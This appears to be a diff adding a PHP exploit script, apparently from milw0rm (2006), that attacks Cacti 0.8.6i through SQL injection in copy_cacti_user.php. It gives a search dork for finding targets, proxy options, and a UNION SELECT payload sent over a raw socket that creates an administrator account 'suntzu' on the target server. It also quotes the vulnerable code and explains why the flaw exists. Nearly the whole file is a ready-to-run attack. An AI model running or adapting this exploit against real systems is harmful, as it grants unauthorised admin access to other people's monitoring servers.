@@ -1,0 +1,169 @@
+<?php
+print_r('
+---------------------------------------------------------------------------
+Cacti 0.8.6i "copy_cacti_user.php" sql injection create new admin exploit
+by rgod
+dork: intitle:"login to cacti"
+mail: retrog at alice dot it
+site: http://retrogod.altervista.org
+---------------------------------------------------------------------------
+');
+
+if ($argc<3) {
+    print_r('
+---------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path OPTIONS
+host:      target server (ip/hostname)
+path:      path to Cacti
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' localhost /cacti/ -P1.1.1.1:80
+php '.$argv[0].' localhost / -p81
+---------------------------------------------------------------------------
+');
+    die;
+}
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$proxy="";
+
+for ($i=3; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+/*
+vulnerable script:
+...
+if (! isset($_SERVER["argv"][0])) {
+	die("This script is only meant to run at the command line.\n");
+}
+if (empty($_SERVER["argv"][2])) {
+	die("\nSyntax:\n php copy_cacti_user.php <template user> <new user>\n\n");
+}
+
+$no_http_headers = true;
+
+include(dirname(__FILE__) . "/include/config.php");
+include_once($config["base_path"] . "/lib/auth.php");
+
+$template_user = $_SERVER["argv"][1];
+$new_user = $_SERVER["argv"][2];
+
+print "Cacti User Copy Utility\n";
+print "Template User: " . $template_user . "\n";
+print "New User: " . $new_user . "\n";
+
+$user_auth = db_fetch_row("select * from user_auth where username = '$template_user'");
+if (! isset($user_auth)) {
+	die("Error: Template user does not exist!\n\n");
+}
+
+print "\nCopying User...\n";
+
+@user_copy($template_user, $new_user);
+
+$user_auth = db_fetch_row("select * from user_auth where username = '$new_user'");
+if (! isset($user_auth)) {
+	die("Error: User not copied!\n\n");
+}
+
+print "User copied...\n";
+...
+
+if register_argc_argv = on you can run the script and inject sql commands in $template_user argument
+(magic_quotes_gpc is not applied to _SERVER array... )
+
+this exploit creates a new admin user with username suntzu and password suntzu
+you will set your own password (I left the 'force password change' option on
+*/
+
+$sql="111111111'/**/UNION/**/SELECT/**/1,'admin','".md5("suntzu")."',0,'Administrator','on','on','on','on','on',1,1,1,1,1/*";
+$packet ="GET ".$p."copy_cacti_user.php?1+$sql+suntzu HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (eregi("User copied",$html)){
+  echo "exploit succeeded...";
+}
+elseif (eregi("user does not exist",$html)){
+  echo "query error...";
+}
+elseif (eregi("only meant to run at the command line",$html)){
+ echo "register_argc_argv = off here, exploit failed...";
+}
+?>
+
+# milw0rm.com [2006-12-30]
